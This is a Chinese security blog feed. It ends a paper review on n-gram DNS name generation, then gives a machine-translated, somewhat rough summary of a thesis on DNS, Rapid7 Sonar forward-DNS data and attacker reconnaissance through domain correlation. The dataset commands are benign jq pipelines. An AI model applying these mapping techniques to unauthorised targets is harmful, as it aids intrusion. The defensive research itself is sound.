描述了不同可能的DNS异常，并作为评估工具绘制了不同的统计数据，例如，通过简单地研究DNS条目中的排版错误或快速流量域的IP地址的变化量。在[17]中，描述了一个大规模的被动DNS工具。<br>Exposure描述了一个大型的被动DNS分析工具，它依赖于15个不同特性的选择。特别是对各种异常行为的检测，而不是其中的一种。定义的特征是基于时间的长周期分析，或者计算条目之间的欧几里德距离以检测突变。例如，他们发现短寿命域只有两个突然的行为变化，而长寿域有多个行为变化。</p><p>在他们的实验中，他们使用了一个经过一周训练的分类器，然后他们只能测试他们的工具。<br>此外，通过在Google上手动检查域名的不同实验来估计假阳性率。本文主要分析了18个域名服务器的自动版本。</p><p>在分析中，他们使用相似性指标Jaccard索引来比较聚集的（&#x2F;24）IP地址集。为了分析网络范围内的模式，他们只需计算Jaccard索引的平均值，就可以将域重新组合成不同的类别，例如网络钓鱼、垃圾邮件等。</p><p>可以看出，很多研究主要集中在对DNS攻击的异常评估上。本文主要研究网络上域的可见性问题。因此，另一个焦点是看域名本身。最近观察到的一个趋势是在法医学和安全研究中使用自然语言处理技术。例如[13]，其中域名是自动的。它们引用基于音节的算法来生成密码或用户名。与本文的主要区别在于它们主要是生成完整的单词，在我们的方法中使用了n-gram方法，使得字符可以通过概率分布生成单词。</p><p>在[19]中，使用[13]中的技术生成域名。借助统计方法，如KulbackLeibler散度或编辑距离度量，可以检测出由著名僵尸网络产生的域名。文献[14]提出了在侦察阶段提取DNS元数据的不同方法。因此，一个推理算法，如字典攻击或暴力强迫被用来产生名称和发送到DNS解析程序。</p><p>关于安全方面的另一个有趣的工作是[20]的论文，其中提到了概率上下文无关语法来生成破解密码的规则。</p><h2 id="0x05-结论"><a href="#0x05-结论" class="headerlink" title="0x05 结论"></a>0x05 结论</h2><p>本文介绍了一种新的DNS名称智能生成方法，即n-gram模型。SDBF的优点是它不局限于词典知识，因为这类专家工具很常见。</p><p>实验表明，SDBF比基于字典的工具能够发现更多的名字。这可以解释为，n-gram模型不需要生成现有的单词，也可以生成简单的字符序列，包括数字和DNS名称的特殊字符</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>原文：<a href="https://ieeexplore.ieee.org/abstract/document/6212021">https://ieeexplore.ieee.org/abstract/document/6212021</a></p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络安全中的DNS分析</title>
    <link href="/2020/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84DNS%E5%88%86%E6%9E%90/"/>
    <url>/2020/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84DNS%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-摘要"><a href="#0x00-摘要" class="headerlink" title="0x00 摘要"></a>0x00 摘要</h2><p>本文提出了域名系统（DNS）与网络安全相关的多个概念。来自Rapid7的一个公共可用的转发<strong>DNS数据集</strong>被用作底层信息源。主要介绍了<strong>域关联</strong>和<strong>子域接管</strong>技术。作为本文的一部分，开发了自定义工具和脚本，以演示上述数据集的理论概念。</p><p><strong>关键字</strong>：DNS，域名，项目声纳，域关联，子域枚举，子域接管</p><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>随着DevOps和容器化的采用，组织越来越多地转向应用程序的快速原型和快速发布周期。虽然应用程序以前是在本地托管的，但如今，云提供商正变得越来越占主导地位[Wei17]。创建了Ansible、Chef或Terraform等工具，以帮助管理员有效地管理云中和本地资源。这些工具可以自动化创建新服务器、设置域名等过程。</p><p>这种过渡带来了新的安全问题。通过拥有大量的<strong>数字足迹</strong>，企业在互联网上的曝光率要高得多。网络对手正试图识别未修补的应用程序和服务，这些应用程序和服务可能导致初始攻击，从而获得内部网络的访问权限。另一个问题是域名管理。由于大型组织遍布全球，<strong>缺乏对域名的集中管理</strong>常常导致各种各样的问题。回想一下发生在2012年的安全事件，当时网络对手曝光了大量的雅虎登录凭证[Goo12]。这一漏洞背后的原因是雅虎的一个子域上的一个易受攻击的web应用程序，在那里可以进行SQL注入。公开暴露的应用程序和服务并不公开[hh17]。</p><p>这篇论文的目的在于<strong>阐明网络对手使用域名来绘制并可能利用其目标的数字足迹的技术</strong>。多篇DNS相关研究论文仅使用有限的一组域名来证明论文[LHW16][Kha+15][KKvE16]中提出的概念。本文提供了研究结果和实践思路，并用<strong>扩展域名数据集</strong>进行了说明。组织可以利用这些想法从网络对手的角度来理解其公开曝光。在这项研究的某些部分，人们在互联网上发现了普遍的错误配置。事实上，第5.3节介绍了在多个知名组织中发现的此类<strong>错误配置</strong>（可利用）。主动通知这些组织，以便他们能够修复发现的问题。</p><p>本文的其余部分结构如下。第二章介绍了域名系统的基本原理。第三章介绍了<strong>寻找域名数据集</strong>的过程。第四章讨论了域相关的问题。在第五章中，介绍了子域接管的概念以及在因特网范围内扫描时得到的结果。最后，第六章是结论</p><h2 id="0x02-DNS"><a href="#0x02-DNS" class="headerlink" title="0x02 DNS"></a>0x02 DNS</h2><p>在解释更高级的概念和分析之前，先描述DNS的基本属性是很有用的。DNS是域名系统的缩写。它是Internet协议（IP）套件的重要组成部分。实际上，每个应用层（在ISO&#x2F;OSI模型中）都需要IP地址（IPv4或IPv6）来建立与另一方的连接。</p><p>因为人们不容易记住IP地址，所以人们创建了一种叫做域名的可读标签。虽然DNS通常只被视为一种协议，但它描述了一个<strong>完整的域名操作系统</strong>。接下来的部分将解释DNS的各个部分，这些部分将在下面的章节中使用。</p><h3 id="2-1-域命名空间"><a href="#2-1-域命名空间" class="headerlink" title="2.1 域命名空间"></a>2.1 域命名空间</h3><p>DNS的主要目的是提供域名解析，即<strong>将域名转换为IP地址</strong>。域名用于标识网络资源，这些资源在不同的网络、协议族、Internet和管理组织中是唯一的。DNS使用<strong>层次结构</strong>来管理其分布式域名系统[DR17]。DNS层次结构，也称为域名空间，是一种树状结构。此树的根节点由标记为“.”（点）的根域表示。根域下面是进一步划分DNS层次结构的顶级域（例如.com、.net、.info等）。在顶级域之下是二级域，依此类推。图2.1说明了域名空间。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns1.jpg" alt="此处输入图片的描述"><br>图2.1：域名空间示意图。DNS树上的每个节点代表一个域。顶级域下是特定组织的域。</p><p>域名用于描述域在DNS树中的位置。域名由一个或多个由“.”（点）分隔的部分（也称为标签）组成。<br>这些标签中的每一个都代表DNS树上的一个级别。图中显示了这些部件的分解情况。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns2.jpg" alt="此处输入图片的描述"><br>图2.2：图示表示域名的不同部分（标签）。域的层次结构从右向左下降。注意，根域（final“.”）在常规域名表示中通常被省略</p><p>域注册是在一个顶级域（TLD）下创建一个新域的过程。域名注册商是一个可以创建新的二级域名的组织。请注意，有多个域注册器（例如GoDaddy、namescheap等）。</p><p>然而，并不是所有的域注册器都可以在所有tld下注册域。例如，.int TLD下的新域名必须得到IANA[Bry16]的明确批准。</p><p>还有一些域，比如co.uk，根据定义，这是二级域，但是需要域注册器在该域下创建“子级”。Mozilla创建了一个公共后缀列表，用于收集所有TLD和二级域，这些域需要一个域注册器来创建这个域[Moz]的新“子级”。为了避免模棱两可，本文的其余部分将从公共后缀列表中只包含一个标签和后缀的域名作为基域。示例列表如下：</p><ul><li>域：example.com；基本域：example.com</li><li>域：sub.example.com；基本域：example.com</li><li>域：example.co.uk；基本域：example.co.uk</li><li>域：sub.sub.example.co.uk；基本域：example.co.uk</li></ul><h3 id="2-2-区域"><a href="#2-2-区域" class="headerlink" title="2.2 区域"></a>2.2 区域</h3><p>DNS区域是域名空间的一部分，由单个实体（一组DNS服务器）管理。 <strong>DNS树使用DNS区域划分为多个管理部分</strong>。 一个DNS区域管理一个域及其子树的任何部分的信息。 区域信息存储在称为区域文件的文件中。这是一个文本文件，其中包含诸如域到IP地址的映射等信息（请参阅第2.3节）。 图2.3说明了可以在DNS树上形成的不同DNS区域。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns3.jpg" alt="此处输入图片的描述"><br>图2.3：域名空间中区域的示例。 节点代表DNS中的域树，红色框代表DNS区域。</p><p><strong>DNS区域可以将它管理的子树的一部分委派给另一个实体</strong>。此过程称为<strong>区域委派</strong>，使用<strong>NS记录</strong>实现（DNS记录在第2.3节中解释）。例如，一个DNS区域example.com网站在管理下，可以将subdomain.example.com（及其整个子树）委派到另一个DNS区域。</p><h3 id="2-3-资源记录"><a href="#2-3-资源记录" class="headerlink" title="2.3 资源记录"></a>2.3 资源记录</h3><p>区域文件是<strong>资源记录的集合</strong>，每个记录提供有关特定对象的信息[LS16]。标准资源记录（RR）由五个字段组成：</p><ul><li>Name<br>指定拥有特定RR的对象。根据记录的不同，“Name”字段可以是主机名或IP地址。</li><li>TTL<br>生存时间（TTL）定义了可以缓存记录的持续时间（以秒为单位）。零表示记录不应缓存。如果未指定TTL，则使用默认的区域TTL值。</li><li>Class<br>定义记录的选区。它总是设置为IN（Internet），这是DNS当前<strong>唯一支持的类</strong>。</li><li>Type<br>记录的指定语义值或用途。RR类型在下面进一步解释。</li><li>Data<br><strong>粗体文本</strong>数据字段保存当前对象的信息。RR字段的值取决于数据的类型。例如，在域到IP地址映射中，数据字段是由IP地址指定的。</li></ul><p>示例RR可以如下所示（字段按上面列出的顺序用空格分隔）：</p><pre><code class="hljs">example.com. 3600 IN A 93.184.216.34</code></pre><p>资源记录集（RRset）是给定域中同一类型的所有记录的名称。基本记录类型列表如下：</p><ul><li>SOA<br>权威的开始。SOA定义了域的<strong>全局参数（所有者名称、序列号、过期日期等）</strong>。单个区域文件中只允许一个SOA记录，并且它必须是区域中指定的第一个RR。</li><li>NS<br><strong>命名服务器</strong>。用于<strong>区域委派</strong>。通常，每个区域文件中都有多个NS记录。</li><li>A<br>地址。它保存32位IPv4地址。这是用于从域名映射到地址的主要类型。</li><li>AAAA<br>IPv6地址。它保存128位IPv6地址。</li><li>CNAME<br>规范名称。一个域名到另一个域名的别名。CNAME可以看作是“DNS重定向”。这在许多其他域名指向同一个IP地址的情况下非常有用。当主地址发生更改时，其他地址将自动更新。CNAME记录将在第5章中详细讨论</li><li>MX<br>交换邮件。为给定域提供邮件服务器。<strong>数据字段还包含MX记录所特有的记录权重</strong>。权重决定了对多个MX记录的偏好。</li><li>TXT<br>文本。可以<strong>保存任意文本数据</strong>。TXT记录的用例包括SPF、DKIM或DMARC配置，这些配置用于防止电子邮件欺骗。</li><li>PTR<br><strong>指针</strong>。PTR记录主要用于<strong>反向DNS解析</strong>。它们与A记录相反：PTR记录将IP地址映射到域名。</li></ul><h3 id="2-4-DNS-解析"><a href="#2-4-DNS-解析" class="headerlink" title="2.4 DNS 解析"></a>2.4 DNS 解析</h3><p>DNS协议是一种<strong>客户端-服务器</strong>协议。DNS服务器保存区域文件并将内容提供给DNS客户端。区域通常由两个称为主服务器和辅助服务器的DNS服务器管理。在主DNS服务器发生故障时，辅助DNS服务器充当备份机制。主DNS服务器保存区域文件的主副本。<strong>辅助DNS服务器使用区域传输定期从主服务器请求区域文件的副本</strong>。</p><p>在特定域名的上下文中，如果名称服务器管理特定域的区域，则称其为权威服务器。例如，如果example.com 区域由ns1.example.com 和 ns2.example.com 管理，则这两个服务器对 example.com 都是权威的. 任何其他DNS服务器对 example.com 都被称为非授权的.</p><p>如果DNS客户端想要获取给定域的IP地址（或来自DNS区域的其他信息），则需要发出DNS查询并<strong>正确地从根域执行区域委派</strong>。这个过程<strong>称为DNS解析</strong>。图2.4说明了example.com网站域。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns4.jpg" alt="此处输入图片的描述"></p><p>图2.4:DNS解析过程。请注意，递归DNS解析程序正在代表用户与其他DNS服务器通信。<strong>步骤7是整个图表中唯一权威的响应</strong>。尽管步骤8返回正确的A记录，但此响应是非权威的，因为它是从非权威DNS服务器返回的（在example.com 的上下文中).</p><p>请注意，在图2.4中，用户不是直接在主机上执行DNS解析，而是使用一个称为递归DNS解析程序的外部服务器。这背后的主要原因是缓存。如果更多的用户共享一个DNS解析程序，它可以更有效地传递结果，因为大多数流行的资源记录已经被缓存。因此，DNS解析程序不执行通常由多个查询组成的完整解析过程来查找权威DNS服务器。</p><p>除了常规资源类型，如2.3节所述，还存在所谓的<strong>伪记录类型或元查询类型</strong>。不同之处在于，元查询类型不直接包含在区域文件中，而是由DNS查询动态创建的。并不是所有的元查询类型都有适当的文档记录，但是，至少有两种被广泛使用的[DR17]：</p><ul><li>AXFR<br>如上所述，辅助DNS服务器使用区域传输从主DNS服务器请求区域文件的当前副本。AXFR元查询类型用于区域传输。</li><li>ANY<br>任何元查询都会返回名称字段为给定域名的每个资源记录。DNS服务器根据DNS查询中的域返回区域的子集。</li></ul><h2 id="0x03-数据集"><a href="#0x03-数据集" class="headerlink" title="0x03 数据集"></a>0x03 数据集</h2><p>本文的其余部分将从网络安全的角度<strong>分析域名及其属性</strong>。这种分析需要一些数据集，从中可以提取事实。本章描述了在选择合适的数据集、其特性和统计信息时发生的过程。</p><h3 id="3-1-全互联网扫描"><a href="#3-1-全互联网扫描" class="headerlink" title="3.1 全互联网扫描"></a>3.1 全互联网扫描</h3><p>互联网范围的扫描是在整个IPv4空间中识别公开暴露的服务的过程[DBH14]。这些扫描背后的想法是在互联网上显示主机。通过互联网范围内的扫描获得的数据，研究人员可以测量协议采用情况，识别大规模问题，等等。本章重点介绍与互联网扫描相关的三个公开项目：Censys、Shodan和scan.io.</p><p>Censys项目定期扫描IPv4空间中的已知端口（例如22、80、443）。它试图定位和识别公开公开的服务。收集到的数据可以通过restapi、web用户界面、google bigquery上的表和可下载的数据集[Dur+15]自由访问。Censys也可以被看作是一种互联网主机的搜索引擎。例如，它可以列出运行Apache（位于捷克共和国）的所有公开可用的web服务器。图B.2显示了Censys web界面的屏幕截图。</p><p><strong>Banner 抓取</strong>是一种用于确定扫描端口[MSK12]上使用的软件类型和版本的技术。Banner 通常是<strong>初次握手后从服务器收到的第一个响应</strong>。HTTP响应头用作HTTP的 Banner 。<br>HTTP响应头通常包含服务器字段，从中可以解析web服务器信息。图3.1演示了这种行为。Banner 抓取可以扩展到SSH、FTP等服务。Censys使用Banner 抓取来生成有关扫描端口上运行的服务的附加信息（例如，软件名称和版本）。</p><p>这种行为与另一个名为Shodan[Sho]的搜索引擎非常相似。与Censys类似，Shodan正在对IPv4空间进行定期扫描。然而，它<strong>更适合物联网（IoT）设备</strong>。Shodan试图通过提供一个用户友好的web界面来提高用户的意识—该界面显示暴露的网络摄像头的视图或开放VNC服务器的屏幕截图。Shodan尝试识别仍然存在常见漏洞的服务，例如Heartbleed。使用Shodan也可以按需扫描。此功能主要针对大型企业。图B.1显示了Shodan的web界面的屏幕截图。</p><p>由于安全研究人员的公开报道和推特，这两个项目在过去几年里广受欢迎。研究人员揭示了各种各样的安全问题，主要集中在新兴的物联网领域。在大型工业组织中，有无数不安全的网络摄像机、控制关键基础设施、暖通空调甚至电力系统的设备[hh17]。互联网范围的扫描有助于安全研究人员找到此类暴露的设备，或包含已知漏洞的设备。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns5.jpg" alt="此处输入图片的描述"><br>图3.1：Banner抓取的简化示例。来自的HTTP响应标头金融市场包含值为Apache的服务器字段。</p><p>另一方面，网络对手正在使用互联网范围内的扫描来发现暴露的资产，这些资产可能被泄露并用于恶意目的。Mirai僵尸网络，有史以来最大的僵尸网络之一，利用了暴露的物联网设备[Ant+17]。Mirai的作者使用互联网范围的扫描来定位没有或默认密码配置的物联网设备。这些设备随后被利用并添加到僵尸网络中。特别是，暴露telnet的设备是主要目标。另一个例子是针对暴露的MongoDB服务的勒索软件攻击。<br>2017年初，数千个未经验证的MongoDB数据库使用勒索软件[Bre17]加密。</p><p>除了Censys，互联网范围内的扫描数据存储库称为scan.io创建了[Cen]。Censys团队在密歇根大学维护它。此存储库包含在Censys扫描期间收集的原始数据（数据集）。研究人员可以直接下载数据，开始做实验或计算统计数据，这是不可能只使用restapi或Censys的用户界面。这些数据集是免费提供的。</p><p>Censys在扫描过程中使用了两种基本成分：</p><ul><li><a href="https://github.com/zmap/zmap">ZMap</a><br>一个千兆位的以太网扫描仪可以在45分钟内扫描整个网络。</li><li><a href="https://github.com/zmap/zgrab2">ZGrab</a><br>ZMap提供的结果的Banner抓取工具</li></ul><p>数据集根据它们所寻址的端口进行拆分。每个数据集被分成更小的部分，包含来自ZMap和ZGrab的单独输出。数据集使用LZ4进行压缩，其内部格式通常为JSON或CSV。</p><p>其中一个数据集由scan.io是DNS（端口53）数据集。由于这是端口53扫描，它没有包含足够的与域名相关的数据。这个数据集包含来自传输层的DNS结果，实际上，它只显示可用的DNS服务器和解析程序。不幸的是，由于上下文不够，这些数据不适用于本文讨论的主题</p><h3 id="3-2-声纳项目"><a href="#3-2-声纳项目" class="headerlink" title="3.2 声纳项目"></a>3.2 声纳项目</h3><p>幸运的是，scan.io存储库不限于来自Censys的数据集。其他研究人员和组织在scan.io存储库分享他们的研究成果。知名网络安全公司Rapid7运行他们的内部互联网扫描。他们定期（每七天）分享这项研究的结果到scan.io. Rapid7将这个研究项目命名为声纳。 这是它们的DNS、SSL、HTTP和UDP扫描的名称</p><p>他们进行DNS扫描的方法与Censys的做法有很大不同。Sonar项目中的DNS数据集从域名的角度进行DNS扫描。正向DNS扫描从一个大的域名列表开始，包括更高级别的域。这些域的源代码由[Har17]提供： </p><ul><li>Dumps of Top Level Domain (TLD) zones</li></ul><p>一些TLD运营商允许请求其DNS区域的完全转储。例如，Verisign是.COM和.NET的运营商。Verisign允许在提交正式请求后下载转储文件[Wri15]。区域文件的转储对于提供基本可见性非常有用。但是，它们通常不包含更高级别的域名，例如子域。目前还没有正式说明Rapid7究竟检索到了哪些TLD区域。但是，该列表包括更新的.COM、.INFO、.ORG、.NET，。商务区和信息区。</p><ul><li>SubjectAltName in SSL certificates</li></ul><p>与DNS扫描并行，projectsonar扫描端口443并<strong>解析SSL证书中的信息</strong>。SSL证书（X.509证书）包含名为SubjectAltName的扩展名。SubjectAltName允许在一个证书中指定多个域名。这种技术通常用于虚拟主机配置（见4.2.1小节）或共享证书。SubjectAltName字段中的域名提供了许多仅使用TLD区域转储无法找到的域名。</p><p>但是，在只扫描IPv4空间以查找证书时存在一个小问题。由于虚拟主机设置的扩展使用（如4.2.1小节所述），TLS扩展名为<strong>服务器名称指示（SNI）<strong>被创建[Bla+06]。它的主要概念是：如果有多个网站托管在同一个IPv4主机上，它们可以</strong>根据客户端请求的域使用不同的SSL证书</strong>。换句话说，如果主机1.2.3.4托管域example.com网站以及example.net，域可以生成单独的证书。将根据请求的域向用户提供正确的证书，该域作为TLS协商过程的一部分进行通信。发送的域名是未加密的。ProjectSonar在证书中存在很大的盲点，因为它不使用SNI，而是只使用IP地址扫描IPv4。这意味着服务器可能使用零个或一个证书（根据其配置）进行响应。但是，服务器可能正在托管数百个其他证书（因为SNI和虚拟主机），这些证书不包括在项目Sonar数据集中。另一方面，如果服务器使用的是没有SNI的虚拟主机设置，也就是说，所有网站共享一个公共证书，SubjectAltName设置正确，则所有这些域都将从证书中提取。除了来自端口443的SSL证书，projectsonar还收集来自其他SSL&#x2F;TLS服务的证书，例如IMAP、POP3和SMTP[Moo15]。这些证书可能包含其他域名，仅使用端口443扫描不会显示这些域名。</p><ul><li>Domain names from HTTP responses</li></ul><p>Sonar项目还包括跨IPv4空间的HTTP服务器扫描。从HTTP响应中提取其他域名。这些域名的位置包括HTTP响应头中的Location字段，或者只是常规的HTML元素，如锚定链接或图像。</p><ul><li>PTR records</li></ul><p>除了正向DNS扫描之外，Rapid7也在进行反向DNS扫描，这是Sonar[Mo015]项目的一部分。反向DNS数据集包括对跨越IPv4地址空间的PTR查找的响应。使用PTR记录获得的域被反馈到用于转发DNS扫描的域列表。</p><p>在Sonar项目中运行前向DNS扫描的每周<strong>过程如下</strong>：</p><p><strong>1.域名列表被编译</strong></p><p>使用上述来源和其他几个来源（Rapid7没有公开披露），每周都会编制一份新的域名列表。由于某些源的被动特性，此列表可能包含不存在的域。</p><p><strong>2.批量DNS解析开始</strong></p><p>Rapid7使用<a href="https://github.com/saghul/pycares">pycares</a> 进行大规模DNS解析。它是c-ares的Python接口，c-ares是一个异步执行DNS请求和名称解析的c库。对于列表中的每个域名，都会对任何元查询类型发出DNS请求。</p><p><strong>3.响应已保存</strong></p><p>从响应中，创建数据集，使用GZIP压缩，并上载到 scan.io存储库。但是，请注意，最终数据集中只包含了响应某些数据的域名。换句话说，响应错误状态的域名（例如NXDOMIN或SERVFAIL）不包含在最终数据集中。</p><p>这种方法的一个问题是某些DNS服务器没有响应任何元查询。CloudFlare是DNS提供商之一，因为基础设施的负载增加而禁用了ANY[GM15]。不响应任何请求的域仍包含在最终数据集中。这至少表明域是活动的，并且在使用迭代解析（分别请求每个资源记录类型）时可以发送有效的响应。</p><p>如前所述，Sonar项目比Censys的53端口扫描更适合域名分析。数据集定期上载，可用于分析历史数据。基于以上所列的原因，本文选择了<a href="https://opendata.rapid7.com/">Sonar</a>项目中的forwarddns数据集（从现在起称为FDNS）作为主要数据集，用于本论文的当前和后续章节。</p><h3 id="3-3-数据集分析"><a href="#3-3-数据集分析" class="headerlink" title="3.3 数据集分析"></a>3.3 数据集分析</h3><p>FDNS是一个GZIP压缩文本文件。每行包含JSON格式的单个DNS响应。未压缩时，它看起来如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns6.jpg" alt="此处输入图片的描述"></p><p>如上例所示，具有多个可用资源记录的域名将这些记录分布在多行中。为example.com网站域，它意味着A、AAAA和两个NS记录。每行至少包含四个键值对：</p><ul><li>Timestamp<br>UNIX时间戳，表示接收响应的时间</li><li>Name<br>域名解析（资源记录的名称字段）</li><li>Type<br>DNS资源记录的类型（资源记录的类型字段）</li><li>Value<br>来自DNS解析程序的响应（资源记录的数据字段）</li></ul><p>对于不允许任何解析的域，包括以下行：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns7.jpg" alt="此处输入图片的描述"></p><p>可以看出，100.43.157.155.static.krypt.com不允许任何元查询。值字段中包含的文本取决于特定的DNS提供程序。这些域还包括称为hinfo的特殊资源类型。使用此值可以很容易地筛选出唯一的值。</p><p>人们可能会注意到，FDNS中的单个记录实际上是一个键值对（key是name字段，value是value field），其中包含附加信息（时间戳和类型）。这种结构使得fdns在处理过程中非常高效（将在下一章中看到）。“name” 字段始终包含域名。根据上下文，值字段包含另一个域名、IPv4地址、IPv6地址或其他文本信息（例如，本文中未使用的SOA、TXT）。因此，处理工具和脚本可以依赖于该名称字段将只包含一个域名。</p><p>在撰写本文时（2017年10月），FDNS的大小为23GB，压缩。<br>未压缩，这相当于大约22亿行。为了有效地处理这些数据量，需要快速的处理工具来读取、过滤和处理包含多个JSON行的压缩文本文件。为此，选择了两个主要的命令行工具：</p><ul><li><p>zcat<br>因为fdns是使用GZIP压缩的，所以第一步是解压缩它。zcat是一个命令行工具，它将压缩文件作为输入，并将未压缩的数据写入标准输出。不需要一次解压缩整个文件；<strong>zcat可以动态地进行解压缩</strong>。</p></li><li><p>jq<br>jq是JSON对象的命令行处理工具。它能够以一种简单的方式解析、过滤和处理JSON对象。jq只能打印选定的键子集、计算if-then-else语句、转换数据等等。<br>jq的另一个好处是它允许处理具有多个JSON对象的文件，而这些对象正是fdns的结构。例如，要仅从FDNS打印name字段，可以使用以下jq命令：</p></li></ul><p>–</p><pre><code class="hljs">zcat 20171027-fdns.json.gz | jq ’.name’</code></pre><p>事实上，大型数据分析系统，如ElasticSearch 6或Splunk 更适合存储和分析FDN。然而，由于数据量巨大，需要对这些系统进行多节点设置，并进行扩展优化，这超出了本文的研究范围。</p><p>本章的其余部分将致力于有关FDNS的基本统计。计算了2017年10月27日收集的FDNS的所有统计数据。</p><h4 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h4><p>可以使用以下命令获取类型字段中不同值的计数：</p><pre><code class="hljs">zcat 20171027-fdns.json.gz| jq -r ’.type’| sort| uniq -c| sort -nr</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns8.jpg" alt="此处输入图片的描述"><br>表3.1:FDNS中10大DNS记录类型。可以看出，与A记录相比，一些CNAME记录相当少。尽管如此，FDNS还是提供了大量的CNAME记录用于实际分析，如第5章所述。</p><p>表3.1显示了不同字段类型值的结果。总体上，有86个不同的值。这些值的一大部分由PyCare生成的各种错误代码获取，因为它无法检索答案（通常是由于RRSIG记录）。这些错误代码被标记为UNK IN，后跟一个数字。值得注意的是，字段类型不一定只包含DNS资源记录类型，还包含错误状态代码。</p><p>可以看出，FDNS包含了将近1800万条HINFO记录。这表明域名不支持任何元查询。</p><p>另一个有趣的观察是fdns包含PTR记录。这是因为。在-地址：arpa域名也包括在初始域名列表中。但是，这些地址的PTR记录指向同一个域，因此大多数PTR记录在name和value字段中具有相同的字符串。请参见以下示例：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns9.jpg" alt="此处输入图片的描述"></p><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>要获取FDNS中所有可解析域名的列表，可以使用以下命令：</p><pre><code class="hljs">zcat 20171027-fdns.json.gz| jq -r ’.name’| sort| uniq</code></pre><p>结果生成122515767个域名。然而，这个统计数据包含所有域名，而不仅仅是基本域。可以使用以下命令提取基域：</p><pre><code class="hljs">zcat 20171027-fdns.json.gz| jq -r ’.name’| python base_domain.py| sort| uniq &gt; base_domains.txt</code></pre><p>Python脚本可以在附件中找到（参见附录A）。它将域名转换为基域（例如。，sub.sub.example.com到example.com网站). 这个过程不能仅仅通过使用“.”（点）拆分字符串来完成。一些顶级域有多个级别，例如。.co.uk.因此，Python脚本包含一个公共顶级域列表，用于将域名正确转换为基域。</p><p>fdns中有182个658426个不同的基域。从基本域列表中，可以使用下面的命令提取顶级域的分布。</p><pre><code class="hljs">cat base_domains.txt| python tld_extract.py| sort| uniq -c| sort -nr</code></pre><p>Python脚本（tld提取.py)将基域转换为顶级域（例如。，example.com网站使用与前一个命令中解释的相同的技术。<br>表3.2列出了顶级域（对于基域）的分布。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns10.jpg" alt="此处输入图片的描述"></p><p>表3.2:FDN中的前10个顶级域。此统计信息是从唯一的基域中检索的。</p><p>还有一个名为dnspop的公共项目，它统计fdn中最常见的域名前缀。这些前缀将在第4.1.1小节中详细讨论。</p><h4 id="CNAME-记录"><a href="#CNAME-记录" class="headerlink" title="CNAME 记录"></a>CNAME 记录</h4><p>因为第5章几乎只处理CNAME记录，所以检索最流行的CNAME记录列表是很有用的。要计算CNAME记录中各种基域的使用情况，可以使用下面的命令。</p><pre><code class="hljs">cat base_domains.txt| python tld_extract.py| sort| uniq -c| sort -nr</code></pre><p>但请注意，只考虑了value字段。原因是value字段定义了CNAME记录的委托位置。表3.3显示了CNAME记录中最常用的提供者。如上文第5章所述。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns11.jpg" alt="此处输入图片的描述"><br>表3.3 CNAME记录值字段中使用的前10个基域</p><p>本节中使用的所有命令都可以作为数据在附件中找到dat_analysis.sh 脚本。</p><h2 id="0x04-域相关性"><a href="#0x04-域相关性" class="headerlink" title="0x04 域相关性"></a><strong>0x04 域相关性</strong></h2><p>本章介绍将多个域名关联到单个实体的思想和技术。这是一个查找域名的过程，域名不同但与同一个人或组织有关。例如，<a href="http://www.google.com/">www.google.com</a>, mail.google.com，和youtube.com网站是不同的域名。然而，这三家公司都与同一家实体有关联：Alphabet公司。</p><p>这种关联过程发生在<strong>杀伤链的侦察阶段</strong>[Sag14]。<br>该组织公开披露的域越多，网络对手的攻击面就越大。例如，这些域可能容易受到<strong>子域接管</strong>的攻击，这是第5章的主题。让我们拿一栋房子做个类比——窗户和门越多，破门而入的几率就越高。即使窗口是防篡改的，也可能有一个窗口被打开一段时间。同样的道理也适用于网络世界。</p><p>本章介绍的概念可以帮助组织从网络对手的角度了解其公开曝光。这种了解进一步导致查明薄弱环节和改进内部安全程序。</p><p>在处理技术细节之前，需要确定垂直域和水平域相关性的定义。图4.1描述了不同之处。</p><p><img 